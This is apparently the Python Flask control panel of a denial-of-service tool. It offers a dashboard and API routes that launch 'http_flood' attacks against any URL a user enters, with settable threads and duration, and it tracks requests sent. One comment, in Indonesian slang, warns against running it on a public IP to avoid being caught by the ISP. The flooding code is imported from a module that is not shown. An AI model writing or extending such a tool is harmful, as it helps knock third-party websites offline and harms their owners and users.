from flask import Flask, render_template, request, jsonify, session
from attack_manager import AttackManager
import threading
import secrets
import time

app = Flask(__name__)
app.secret_key = secrets.token_hex(32)
manager = AttackManager()

# Homepage dashboard
@app.route('/')
def dashboard():
    if 'user' not in session:
        session['user'] = f"void_user_{secrets.token_hex(4)}"
    
    stats = {
        'active_attacks': manager.get_active_count(),
        'total_requests_sent': manager.total_requests,
        'uptime': time.time() - manager.start_time
    }
    return render_template('dashboard.html', stats=stats, user=session['user'])

# API untuk mulai attack
@app.route('/api/attack/start', methods=['POST'])
def start_attack():
    data = request.json
    target_url = data.get('url')
    threads = int(data.get('threads', 100))
    duration = int(data.get('duration', 60))
    attack_type = data.get('type', 'http_flood')
    
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'http://' + target_url
    
    attack_id = manager.launch_attack(
        target_url=target_url,
        threads=threads,
        duration=duration,
        attack_type=attack_type
    )
    
    return jsonify({
        'status': 'LAUNCHED',
        'attack_id': attack_id,
        'message': f'🔥 Attack {attack_id} deployed to {target_url}'
    })

# API stop attack
@app.route('/api/attack/stop/<attack_id>', methods=['POST'])
def stop_attack(attack_id):
    success = manager.stop_attack(attack_id)
    return jsonify({'status': 'TERMINATED' if success else 'NOT_FOUND'})

# Live stats API
@app.route('/api/stats')
def get_stats():
    return jsonify(manager.get_all_stats())

if __name__ == '__main__':
    # Jangan run di public IP kalo gak mau ditangkap ISP lu
    app.run(host='127.0.0.1', port=5000, debug=False)